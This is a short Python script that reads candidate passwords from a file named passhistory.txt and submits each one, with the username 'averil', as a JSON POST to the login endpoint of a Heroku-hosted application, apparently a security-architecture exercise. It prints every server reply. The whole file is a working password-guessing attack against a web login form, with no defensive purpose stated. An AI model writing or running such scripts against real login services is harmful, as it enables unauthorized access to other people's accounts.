import http.client
import requests
import json

with open("passhistory.txt","r") as file:
  for line in file:
    print (line)
    word = line.replace('\n','')
    req = http.client.HTTPConnection('arquitctura-seguridad.herokuapp.com')
    headers = {'Content-type': 'application/json'}
    payload = {'user': 'averil','password':f'{word}'}
    json_data = json.dumps(payload)
    req.request('POST','/ARCHITECTURE/login/', json_data, headers)
    print(req.request)
    response = req.getresponse()
    print(response.read().decode())
    
